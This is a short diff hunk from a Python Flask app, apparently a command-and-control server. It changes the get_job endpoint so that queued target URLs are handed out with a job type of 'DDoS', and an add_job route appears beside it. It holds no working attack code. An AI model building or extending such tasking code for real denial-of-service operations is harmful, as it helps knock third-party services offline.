@@ -43,7 +43,7 @@ def get_job():
     if len(jobs) == 0:
         return jsonify({"status": "no_jobs"})
 
-    return jsonify({"status": "ok", "url": jobs})
+    return jsonify({"status": "ok", "url": jobs, "job_type": "DDoS"})
     
 @app.route("/add_job/", methods=["POST"])
 def add_job():
